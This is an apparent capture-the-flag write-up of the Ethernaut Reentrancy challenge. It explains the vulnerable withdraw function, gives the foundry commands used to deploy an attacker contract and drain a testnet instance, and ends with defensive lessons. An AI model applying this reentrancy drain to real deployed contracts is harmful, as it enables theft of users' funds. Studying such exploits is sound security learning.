# Ethernaut Challenge 10 — Reentrancy

The goal of this level is to **drain all ETH from the contract**.

Instance address:

```

0x4F688a59A5Ca69dD306D7445b619316545DA7d79

````

---

## 🎯 Goal

Steal all the funds from the `Reentrance` contract.

---

## 🧠 Thought process

The vulnerability is in the `withdraw` function:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;
    }
}
````

Key observations:

* ETH is sent using `call`
* `call` forwards all gas → enables reentrancy
* the external call happens **before** updating storage
* `balances[msg.sender]` is decreased **after**

This violates the **checks-effects-interactions** pattern.

👉 This allows an attacker to:

1. call `withdraw`
2. receive ETH
3. reenter `withdraw` before the balance is updated
4. drain the contract

---

## 🔍 Step 1 — Check contract balance

Define a variable:

```bash
REENTRANCE_ADDRESS_SEPOLIA=0x4F688a59A5Ca69dD306D7445b619316545DA7d79
```

Check the balance:

```bash
cast balance $REENTRANCE_ADDRESS_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```
0.001000000000000000
```


## 🧪 Step 2 - Local testing

To better understand and validate the exploit, I wrote a test in: src/test/ReentranceTest.sol


The test simulates the full attack locally:

- deploys the vulnerable `Reentrance` contract
- funds it with ETH
- deploys the `ReentranceAttacker`
- executes the attack
- verifies that the contract is fully drained

This allowed me to:

- observe the recursive reentrancy behavior step by step
- confirm that the exploit works before executing it on Sepolia
- debug edge cases such as recursion depth and ETH amounts

---

## 🧪 Step 3 — Deploy attacker contract on Sepolia

I created `ReentranceAttacker.sol` to exploit the vulnerability.

```bash
forge create src/challenge-10-re-entrancy/ReentranceAttacker.sol:ReentranceAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast \
  --constructor-args $REENTRANCE_ADDRESS_SEPOLIA
```

Deployed address:

```
0xD3f4c8A2b982009fdE218055111712F1C96694aF
```

Save it:

```bash
REENTRANCE_ATTACKER_ADDRESS_SEPOLIA=0xD3f4c8A2b982009fdE218055111712F1C96694aF
```

---

## 🚀 Step 4 — Execute the attack

Call the attack function:

```bash
cast send $REENTRANCE_ATTACKER_ADDRESS_SEPOLIA \
    "attack()" \
    --value 0.001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

---

## ✅ Step 5 — Verify the result

Check the contract balance:

```bash
cast balance $REENTRANCE_ADDRESS_SEPOLIA \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```
0.000000000000000000
```

The contract has been successfully drained.

---

## 🛡️ Security takeaway

This challenge demonstrates a classic **reentrancy vulnerability**.

Key lessons:

* never make external calls before updating state
* follow the **checks-effects-interactions** pattern
* `call` forwards all gas and enables reentrancy
* always update balances **before** transferring ETH
* consider using reentrancy guards (`nonReentrant`)



